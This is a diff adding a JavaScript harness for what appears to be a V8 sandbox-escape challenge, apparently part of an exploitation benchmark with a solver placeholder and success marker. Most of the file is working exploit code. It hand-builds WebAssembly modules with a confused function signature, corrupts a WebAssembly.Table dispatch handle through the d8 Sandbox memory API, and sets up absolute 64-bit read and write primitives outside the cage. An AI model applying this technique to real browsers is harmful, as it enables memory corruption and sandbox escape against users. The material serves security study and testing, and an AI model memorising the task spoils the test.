@@ -1,0 +1,349 @@
+const realSandbox = globalThis.Sandbox;
+if (realSandbox === undefined) {
+    throw new Error("This challenge requires d8 with --sandbox-testing enabled.");
+}
+
+const I32 = 0x7f;
+const I64 = 0x7e;
+const REF_NULL = 0x63;
+const FUNC = 0x60;
+const STRUCT = 0x5f;
+const SUBTYPE = 0x50;
+const GC = 0xfb;
+const NULLREF_CODE = 0x71;
+
+const OP = {
+    local_get: 0x20,
+    ref_func: 0xd2,
+    i64_const: 0x42,
+    i64_eq: 0x51,
+    i64_load: 0x29,
+    i64_store: 0x37,
+    call_function: 0x10,
+    call_ref: 0x14,
+    return_: 0x0f,
+    ref_null: 0xd0,
+    if: 0x04,
+    else_: 0x05,
+    end: 0x0b,
+};
+
+const GCOP = {
+    struct_get: 0x02,
+    struct_set: 0x05,
+};
+
+function u32v(value) {
+    const out = [];
+    value >>>= 0;
+    do {
+        let byte = value & 0x7f;
+        value >>>= 7;
+        if (value) byte |= 0x80;
+        out.push(byte);
+    } while (value);
+    return out;
+}
+
+function i32v(value) {
+    value |= 0;
+    const out = [];
+    for (;;) {
+        let byte = value & 0x7f;
+        value >>= 7;
+        const done = (value === 0 && (byte & 0x40) === 0) || (value === -1 && (byte & 0x40) !== 0);
+        if (!done) byte |= 0x80;
+        out.push(byte);
+        if (done) return out;
+    }
+}
+
+function i64v(value) {
+    value = BigInt(value);
+    const out = [];
+    for (;;) {
+        let byte = Number(value & 0x7fn);
+        value >>= 7n;
+        const done = (value === 0n && (byte & 0x40) === 0) || (value === -1n && (byte & 0x40) !== 0);
+        if (!done) byte |= 0x80;
+        out.push(byte);
+        if (done) return out;
+    }
+}
+
+function str(value) {
+    return [value.length, ...Array.from(value, (c) => c.charCodeAt(0))];
+}
+
+function section(id, body) {
+    return [id, ...u32v(body.length), ...body];
+}
+
+function valtype(type) {
+    return Array.isArray(type) ? type : [type];
+}
+
+function refNull(typeIndex) {
+    return [REF_NULL, ...i32v(typeIndex)];
+}
+
+function funcType(params, results) {
+    const out = [FUNC, ...u32v(params.length)];
+    for (const param of params) out.push(...valtype(param));
+    out.push(...u32v(results.length));
+    for (const result of results) out.push(...valtype(result));
+    return out;
+}
+
+function field(type) {
+    return [...valtype(type), 0x01];
+}
+
+function structType(fields) {
+    return [SUBTYPE, 0x00, STRUCT, ...u32v(fields.length), ...fields.flat()];
+}
+
+function body(code, locals = []) {
+    const header = [...u32v(locals.length)];
+    for (const [count, type] of locals) {
+        header.push(...u32v(count), ...valtype(type));
+    }
+    const bytes = [...header, ...code, OP.end];
+    return [...u32v(bytes.length), ...bytes];
+}
+
+function i64Const(value) {
+    return [OP.i64_const, ...i64v(value)];
+}
+
+function importSection(module, name, typeIndex) {
+    return [
+        ...u32v(1),
+        ...str(module),
+        ...str(name),
+        0x00,
+        ...u32v(typeIndex),
+    ];
+}
+
+function exportFuncSection(exports) {
+    const out = [...u32v(exports.length)];
+    for (const [name, index] of exports) {
+        out.push(...str(name), 0x00, ...u32v(index));
+    }
+    return out;
+}
+
+function buildDispatchReaderModule() {
+    const $s = 0;
+    const $sig_ls_ll = 1;
+    const $fn = 0;
+    const $call_fn = 1;
+
+    const types = [
+        ...u32v(2),
+        ...structType([field(I64)]),
+        ...funcType([I64, I64], [I64, refNull($s)]),
+    ];
+    const functions = [...u32v(1), ...u32v($sig_ls_ll)];
+    const elements = [...u32v(1), 0x03, 0x00, ...u32v(1), ...u32v($fn)];
+    const exports = exportFuncSection([["call_fn", $call_fn]]);
+    const callFnBody = [
+        OP.local_get, 0,
+        OP.local_get, 1,
+        OP.ref_func, ...u32v($fn),
+        OP.call_ref, ...u32v($sig_ls_ll),
+    ];
+    const codes = [...u32v(1), ...body(callFnBody)];
+
+    return new Uint8Array([
+        0x00, 0x61, 0x73, 0x6d,
+        0x01, 0x00, 0x00, 0x00,
+        ...section(1, types),
+        ...section(2, importSection("import", "fn", $sig_ls_ll)),
+        ...section(3, functions),
+        ...section(7, exports),
+        ...section(9, elements),
+        ...section(10, codes),
+    ]);
+}
+
+function buildAbsolutePrimitiveModule() {
+    const $s2 = 0;
+    const $sig_ls_ll2 = 1;
+    const $sig_l_l = 2;
+    const $sig_v_ll = 3;
+    const $fn2 = 0;
+    const $called_fn = 1;
+    const $read64 = 2;
+    const $write64 = 3;
+
+    const types = [
+        ...u32v(4),
+        ...structType([field(I64)]),
+        ...funcType([I64, I64], [I64, refNull($s2)]),
+        ...funcType([I64], [I64]),
+        ...funcType([I64, I64], []),
+    ];
+    const functions = [...u32v(3), ...u32v($sig_ls_ll2), ...u32v($sig_l_l), ...u32v($sig_v_ll)];
+    const memory = [...u32v(1), 0x04, ...u32v(1)];
+    const exports = exportFuncSection([
+        ["called_fn", $called_fn],
+        ["read64", $read64],
+        ["write64", $write64],
+    ]);
+    const calledFnBody = [
+        OP.local_get, 0,
+        ...i64Const(-1n),
+        OP.i64_eq,
+        OP.if, I64,
+            OP.local_get, 1,
+            OP.i64_load, 1, 0,
+        OP.else_,
+            OP.local_get, 0,
+            OP.local_get, 1,
+            OP.i64_store, 1, 0,
+            ...i64Const(0n),
+        OP.end,
+        OP.ref_null, NULLREF_CODE,
+    ];
+    const read64Body = [
+        OP.local_get, 0,
+        ...i64Const(0n),
+        OP.call_function, ...u32v($fn2),
+        GC, GCOP.struct_get, ...u32v($s2), 0x00,
+        OP.return_,
+    ];
+    const write64Body = [
+        OP.local_get, 0,
+        ...i64Const(0n),
+        OP.call_function, ...u32v($fn2),
+        OP.local_get, 1,
+        GC, GCOP.struct_set, ...u32v($s2), 0x00,
+        OP.return_,
+    ];
+    const codes = [
+        ...u32v(3),
+        ...body(calledFnBody),
+        ...body(read64Body),
+        ...body(write64Body),
+    ];
+
+    return new Uint8Array([
+        0x00, 0x61, 0x73, 0x6d,
+        0x01, 0x00, 0x00, 0x00,
+        ...section(1, types),
+        ...section(2, importSection("import", "fn2", $sig_ls_ll2)),
+        ...section(3, functions),
+        ...section(5, memory),
+        ...section(7, exports),
+        ...section(10, codes),
+    ]);
+}
+
+function read32Caged(offset) {
+    return new DataView(new realSandbox.MemoryView(Number(offset), 4)).getUint32(0, true);
+}
+
+function write32Caged(offset, value) {
+    new DataView(new realSandbox.MemoryView(Number(offset), 4)).setUint32(0, Number(value) >>> 0, true);
+}
+
+function tableHandle(table) {
+    return read32Caged(realSandbox.getAddressOf(table) + 0x1c);
+}
+
+function writeTableHandle(table, handle) {
+    write32Caged(realSandbox.getAddressOf(table) + 0x1c, handle);
+}
+
+function prepareDispatchState() {
+    const paddingTables = Array.from({ length: 0x100 }, () => new WebAssembly.Table({ initial: 1, maximum: 1, element: "anyfunc" }));
+    const table0 = new WebAssembly.Table({ initial: 1, maximum: 1, element: "anyfunc" });
+    const instance1 = new WebAssembly.Instance(new WebAssembly.Module(buildDispatchReaderModule()), {
+        import: { fn: () => [42n, null] },
+    });
+    const { call_fn } = instance1.exports;
+    call_fn(0n, 0n);
+
+    const table1 = new WebAssembly.Table({ initial: 1, maximum: 1, element: "anyfunc" });
+    const table2 = new WebAssembly.Table({ initial: 1, maximum: 1, element: "anyfunc" });
+    const h1 = tableHandle(table1);
+    const h2 = tableHandle(table2);
+    const stride = (h2 - h1) | 0;
+    if (stride === 0) throw new Error("dispatch-table handle stride calibration failed");
+
+    const growTable = new WebAssembly.Table({ initial: 0, maximum: 0x10, element: "anyfunc" });
+    const targetHandle = (h1 - stride * 6) >>> 0;
+    writeTableHandle(growTable, targetHandle);
+    growTable.grow(0x10);
+
+    return call_fn;
+}
+
+const call_fn = prepareDispatchState();
+const instance2 = new WebAssembly.Instance(new WebAssembly.Module(buildAbsolutePrimitiveModule()), {
+    import: { fn2: (x) => [0n, x - 7n] },
+});
+const { called_fn, read64 } = instance2.exports;
+
+for (let i = 0; i < 100; i++) called_fn(1n, 2n);
+
+Object.defineProperty(globalThis, "Sandbox", {
+    value: undefined,
+    writable: false,
+    configurable: false,
+});
+
+let usedSigRead = false;
+let usedSigWrite = false;
+
+function sigRead(offset) {
+    const ofs = BigInt(offset);
+    if (ofs !== 0x30n) {
+        throw new Error("Read the source signature state at offset 0x30.");
+    }
+    usedSigRead = true;
+    return call_fn(-1n, ofs)[0];
+}
+
+function sigWrite(offset, value) {
+    const ofs = BigInt(offset);
+    if (ofs !== 0x28n) {
+        throw new Error("Write the copied signature state to offset 0x28.");
+    }
+    usedSigWrite = true;
+    call_fn(ofs, BigInt(value))[0];
+}
+
+function absRead64(address) {
+    return read64(BigInt(address));
+}
+
+const probeAddress = 0x555555554000n;
+const expectedProbeValue = 0x00010102464c457fn;
+const api = Object.freeze({
+    sigRead,
+    sigWrite,
+    read64: absRead64,
+    probeAddress,
+});
+
+__PWN_SOLVE_SOURCE__;
+
+if (typeof solve !== "function") {
+    throw new Error("define solve(api)");
+}
+
+const result = solve(api);
+if (!usedSigRead) {
+    throw new Error("Use sigRead(0x30n) to read the source signature state.");
+}
+if (!usedSigWrite) {
+    throw new Error("Use sigWrite(0x28n, value) to patch the destination signature state.");
+}
+if (BigInt(result) !== expectedProbeValue) {
+    throw new Error("After patching signature state, return read64(probeAddress).");
+}
+
+print("__PWN_SUCCESS_MARKER__");
